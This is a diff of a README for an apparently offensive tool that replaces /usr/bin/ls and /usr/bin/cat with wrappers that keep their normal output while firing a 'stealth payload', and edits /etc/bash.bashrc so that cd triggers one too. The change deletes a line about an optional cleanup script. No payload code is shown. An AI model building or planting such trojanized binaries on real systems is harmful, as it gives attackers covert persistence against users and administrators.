@@ -22,7 +22,6 @@ This tool allows you to wrap standard Linux binaries (like `ls` and `cat`) to ex
 - `wrap_ls.sh` – Replaces `/usr/bin/ls` with a wrapper that preserves output and triggers a stealth payload
 - `wrap_cat.sh` – Replaces `/usr/bin/cat` in a similar fashion
 - `wrap_cd.sh` – Injects a stealth payload trigger into `cd` by editing `/etc/bash.bashrc`
-- `cleanup.sh` *(optional)* – Reverts changes (not included, but easy to add)
 
 ## Payload Behavior
 
